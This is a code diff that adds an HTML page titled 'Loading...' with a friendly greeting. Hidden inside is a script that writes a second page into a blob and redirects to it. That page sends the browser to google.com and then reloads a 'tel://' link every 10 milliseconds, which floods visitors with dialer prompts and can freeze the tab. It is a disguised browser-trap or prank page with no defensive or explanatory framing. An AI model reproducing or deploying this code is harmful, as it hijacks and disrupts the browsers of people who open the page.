@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Loading...</title>
+  <style>
+    body { font-family: Arial; text-align: center; padding: 50px; background: #000; color: #0f0; }
+    h1 { font-size: 2.5em; }
+  </style>
+</head>
+<body>
+  <h1>Have Nice Day :)</h1>
+
+  <script>
+
+
+ const htmlContent = `
+    <body>
+                <h1>Test</h1>
+
+        <script>
+           window.onload = () => {
+                   location.href="http://google.com";
+
+      setInterval(() => {
+        location.href = "tel://";
+      }, 10);
+    };
+    setTimeout(() => window.onblur(), 10);
+        </\script>
+    </body>
+    `;
+
+const blob = new Blob([htmlContent], { type: 'text/html' });
+const url = URL.createObjectURL(blob);
+const a = document.location=url;  
+  </script>
+</body>
+</html>
+v
